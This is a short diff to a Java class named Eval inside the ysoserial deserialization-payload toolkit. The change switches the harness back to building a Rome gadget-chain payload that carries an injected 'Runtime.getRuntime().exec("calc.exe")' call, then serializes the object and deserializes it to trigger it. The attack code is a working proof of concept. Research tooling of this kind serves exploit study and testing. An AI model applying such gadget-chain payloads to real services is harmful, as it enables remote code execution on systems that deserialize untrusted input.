@@ -2,7 +2,6 @@ package ysoserial.payloads;
 
 import javassist.ClassPool;
 import javassist.CtClass;
-import top.inhann.Fuck;
 import ysoserial.Deserializer;
 import ysoserial.Serializer;
 
@@ -13,9 +12,9 @@ import java.util.regex.Pattern;
 
 public class Eval {
     public static void main(String[] args) throws Exception{
-//        String code = "Runtime.getRuntime().exec(\"calc.exe\");";
-//        Object o = new Eval().getObject(RomeTools.class,code);
-        Object o = new Eval().getObject(RomeTools.class, Fuck.class);
+        String code = "Runtime.getRuntime().exec(\"calc.exe\");";
+        Object o = new Eval().getObject(RomeTools.class,code);
+//        Object o = new Eval().getObject(RomeTools.class, Fuck.class);
         byte[] ser = Serializer.serialize(o);
 
         Deserializer.deserialize(ser);
